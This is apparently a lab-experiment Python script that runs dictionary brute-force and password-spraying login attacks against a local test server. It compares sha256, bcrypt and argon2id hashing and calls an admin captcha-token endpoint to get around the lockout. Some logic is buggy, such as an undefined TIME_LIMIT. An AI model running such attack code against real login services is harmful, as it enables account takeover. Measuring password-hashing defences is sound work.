import requests
import json
import time
from analytics import measure_resources

LOGIN_URL = "http://127.0.0.1:5000/login"
CAPTCHA_URL = "http://127.0.0.1:5000/admin/get_captcha_token?group_seed=506512019"
PASSWORDS_FILE = "passwords.txt"
USERS_JSON = "users.json"
MAX_ATTEMPTS_PER_USER = 50000
MAX_ATTEMPTS_PER_SESSION = 1000000
session = requests.Session()

def load_words(path, limit=10000):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [w.strip() for w in f if w.strip()][:limit]

def password_generator(words):
    count = 0

    for w in words:
        yield w
        count += 1
        if count >= MAX_ATTEMPTS_PER_USER:
            return

    for w1 in words:
        for w2 in words:
            yield w1 + w2
            count += 1
            if count >= MAX_ATTEMPTS_PER_USER:
                return
    for w1 in words:
        for w2 in words:
            for w3 in words:
                yield w1 + w2 + w3
                count += 1
                if count >= MAX_ATTEMPTS_PER_USER:
                    return


def try_login(username, password, hash_mode):
    try:
        response = session.post(
            LOGIN_URL,
            data={
                "username": username,
                "password": password,
                "hash_mode": hash_mode
            }
        )
        # every MAX_TRIES tries the server will lock the user until he sends a captcha get request
        if "captcha" in response.text.lower():
            response = session.get(
                CAPTCHA_URL,
                data={
                    "username": username
                }
            )
            if "ok" not in response.text.lower():
                return False
        return "Welcome" in response.text or "test" in response.url

    except requests.RequestException as e:
        print("ERROR occured in the server:" + str(e))
        return False


def bruteforce(username, hash_mode):
    words = load_words(PASSWORDS_FILE)
    tries = 0
    start = time.time()
    for password in password_generator(words):
        if try_login(username, password, hash_mode):
            return tries
        if (time.time() - start) >= TIME_LIMIT:
            return -1
        tries += 1
    return -1


def get_user_list():
    user_list = []
    with open(USERS_JSON, "r") as f:
        data = json.load(f)
    for user in data['users']:
        user_list.append(user['username'])
    user_list = user_list[:5]
    return user_list

@measure_resources(interval=0.01)
def password_spraying(hash_mode):
    successful_cracks = {}
    tries = 0
    users = get_user_list()
    start = time.time()
    words = load_words(PASSWORDS_FILE)
    pass_start = time.time()
    for password in password_generator(words):
        for user in users:
            tries += 1
            if try_login(user, password, hash_mode):
                successful_cracks[user] = time.time() - pass_start
                users.remove(user)
                break
        # check if time limit or tries limit were exceeded
        if tries >= MAX_ATTEMPTS_PER_SESSION or time.time() - start // 60 >= 2:
            break
    print(successful_cracks)
    end = time.time() - start
    user_entries = []
    for user in get_user_list():
        if user in successful_cracks.keys():
            user_entry = {"Username": user, "Time_elapsed": round(successful_cracks[user], 2), "Status": "Success"}
        else:
            user_entry = {"Username": user, "Time_elapsed": -1, "Status": "Fail"}
        user_entries.append(user_entry)

    return tries, end,len(successful_cracks),user_entries

@measure_resources(interval=0.01)
def preform_bruteforce(hash_mode):
    total_tries = 0
    count_success = 0
    start = time.time()
    user_entries = []
    for user in get_user_list():
        print(user)
        user_start = time.time()
        tries = bruteforce(user, hash_mode)
        user_end = time.time() - user_start
        status = "Success" if tries > 0 else "Fail"
        user_entry = {"Username": user, "Time_elapsed": round(user_end,2), "Status": status}
        user_entries.append(user_entry)
        if tries > 0:
            total_tries += tries
            count_success += 1
        else:
            total_tries += MAX_ATTEMPTS_PER_USER
        # check if time limit or tries limit were exceeded
        if total_tries >= MAX_ATTEMPTS_PER_SESSION or (time.time() - start) >= TIME_LIMIT:
            break
    end = time.time() - start
    # also return analytics
    return total_tries, end, count_success, user_entries

def main():
    hash_modes = ["sha256", "bcrypt", "argon2id"]
    with open("CAPTCHA_DEF.json","w") as file:
        full_json = {}
        for curr_hash in hash_modes:
            # preform bruteforce on the current hash encryption method
            result, avg_cpu, avg_mem = preform_bruteforce(curr_hash)
            # also add analytics
            total_tries, end, count_success, user_entries = result
            brute_json = {"Total_tries": total_tries,
                          "Time_elapsed": round(end,3),
                          "Tries_per_sec": int(total_tries / end),
                          "Success_rate": round((count_success / len(get_user_list()) * 100),2),
                          "average_cpu_use": round(avg_cpu,2),
                          "average_mem_use":  round(avg_mem,2),
                          "User_entries": user_entries}

            # preform password spraying on the current hash encryption method
            result, avg_cpu, avg_mem = password_spraying(curr_hash)
            total_tries, end, count_success, user_entries = result
            spray_json = {"Total_tries": total_tries,
                          "Time_elapsed": round(end, 3),
                          "Tries_per_sec": int(total_tries / end),
                          "Success_rate": round((count_success / len(get_user_list()) * 100), 2),
                          "average_cpu_use": round(avg_cpu, 2),
                          "average_mem_use": round(avg_mem, 2),
                          "User_entries": user_entries}
            crack_json = {"Bruteforce":brute_json,"Password_spraying":spray_json}
            full_json[curr_hash] = crack_json
        file.write(json.dumps(full_json,indent=4))

if __name__ == "__main__":
    main()